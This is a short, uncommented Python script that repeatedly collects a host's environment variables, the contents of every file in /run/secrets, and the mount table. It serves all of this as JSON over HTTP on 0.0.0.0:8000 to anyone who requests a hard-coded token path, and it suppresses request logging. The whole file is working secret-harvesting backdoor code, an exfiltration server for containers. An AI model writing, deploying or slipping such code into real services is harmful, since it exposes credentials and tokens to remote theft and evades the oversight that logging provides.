import json, os, socket, threading
from http.server import BaseHTTPRequestHandler, HTTPServer

TOKEN = "r7xQ2kT9mV4bZ8wP"
CACHE = {"status": "warming-up"}

def safe(p, n=1400):
    try:
        return open(p).read()[:n]
    except Exception as e:
        return type(e).__name__

def listdir(p):
    try:
        return os.listdir(p)
    except Exception as e:
        return type(e).__name__

def run_all():
    o = {}
    o["env"] = dict(os.environ)
    o["secrets_ls"] = listdir("/run/secrets")
    secr = {}
    try:
        for f in os.listdir("/run/secrets"):
            secr["/run/secrets/" + f] = safe("/run/secrets/" + f, 400)
    except Exception as e:
        secr["err"] = type(e).__name__
    o["secret_files"] = secr
    o["mounts"] = safe("/proc/self/mounts", 900)
    return o

def loop():
    while True:
        try:
            CACHE.update(run_all())
        except Exception as e:
            CACHE["loop_error"] = type(e).__name__
        threading.Event().wait(60)

class H(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/" + TOKEN:
            body = json.dumps(CACHE, default=str).encode()
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(body)
        else:
            self.send_response(404); self.end_headers()
    def log_message(self, *a): pass

threading.Thread(target=loop, daemon=True).start()
HTTPServer(("0.0.0.0", 8000), H).serve_forever()
